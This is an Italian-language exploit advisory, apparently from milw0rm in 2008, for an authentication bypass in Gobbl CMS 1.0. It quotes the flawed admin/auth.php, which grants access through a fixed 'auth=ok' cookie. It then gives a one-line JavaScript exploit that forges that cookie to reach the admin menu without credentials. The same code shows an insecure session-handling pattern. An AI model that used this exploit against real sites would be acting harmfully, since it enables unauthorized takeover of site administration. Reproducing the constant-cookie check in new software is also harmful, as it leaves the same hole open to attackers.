@@ -1,0 +1,37 @@
+---------------------------
+Gobbl Cms 1.0 I.Cookie Hand.
+---------------------------
+Autore: x0r ( Evolution Team)
+Email: andry2000@hotmail.it
+Demo Site:http://www.gobbl.net/
+---------------------------
+ 
+Bug In: \admin\auth.php  
+ 
+?>
+include ('../config.php');
+ 
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+ 
+if ( ($user == $un) and ($pass == $pw) )
+{
+setcookie( "auth", "ok", time()+40000 ); # Bugz
+header ( "location:add.php" ); exit ();
+}
+else
+{
+header ( "location:index.php" ); exit ();
+}
+?>
+ 
+Il file auth.php controlla se nel file ../config.php le post $user\$pass presentano gli stessi dati delle variabili
+$un\$pw ( config.php ) se così è setta il cookie auth=ok :P ^ ^
+ 
+Exploit:  
+ 
+javascript:document.cookie = "auth=ok; path=/"; then \admin\menu.php # So Easy To Hack :P
+ 
+Greetz: Amore Mio Sei La Mia Stella Che Mi Illumina Qua Giù...Ti AmO
+
+# milw0rm.com [2008-12-18]
